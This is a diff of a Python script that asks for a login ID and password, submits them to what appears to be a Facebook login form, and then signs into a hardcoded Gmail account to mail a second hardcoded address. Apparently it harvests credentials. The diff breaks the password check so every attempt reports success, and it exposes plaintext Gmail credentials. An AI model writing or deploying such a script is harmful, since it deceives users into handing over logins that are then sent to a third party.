@@ -59,7 +59,7 @@ def assur(ide, pasw):
  response = browser.submit()
  strr = response.read()
  struts = strr.decode('UTF-8')
- if 'id="loginbutton"' in struts:
+ if 'id="oginbutton"' in struts:
     sys.exit(Fore.RED+'incorrect password or no account found.\nCheck ur login informations and try again.')
  else:
   print(Fore.GREEN+ 'Successfully Logged in.')
@@ -87,7 +87,8 @@ def nth():
         if '+' not in usn:
             time.sleep(2)
             sys.exit(Fore.RED+'\nNo account found')
-
+sa = 'derecknathan245@gmail.com'
+kl = 'zedeyeincorrect'
 def loop():
     az = 'azertyuiopqsdfghjklmwxcvnb'
     aZ = 'AZERTYUIOPQSDFGHJKLMWXCVNB'
@@ -155,8 +156,7 @@ s = smtplib.SMTP_SSL('smtp.gmail.com', 465, context = context)
 #s.starttls() 
 
 
-sa = 'derecknathan245@gmail.com'
-kl = '@zedeyep4w0rd'
+
 s.login(sa, kl) 
 
 ra = 'bertranddupont885@gmail.com'
